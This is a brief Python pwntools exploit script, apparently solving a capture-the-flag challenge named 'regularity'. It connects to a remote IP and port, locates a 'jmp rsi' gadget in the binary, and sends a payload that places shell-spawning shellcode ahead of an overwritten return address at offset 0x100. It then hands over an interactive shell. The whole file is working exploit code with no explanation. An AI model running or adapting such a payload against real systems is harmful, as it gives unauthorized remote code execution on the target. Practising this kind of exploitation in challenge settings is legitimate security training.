from pwn import *

context.binary = elf = ELF('./regularity', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

p = remote('94.237.120.190', 44450)

JMP_RSI = next(elf.search(asm('jmp rsi')))

payload = flat({
    0:      asm(shellcraft.sh()),
    0x100:  JMP_RSI
})

p.sendlineafter(b'days?\n', payload)
p.interactive()
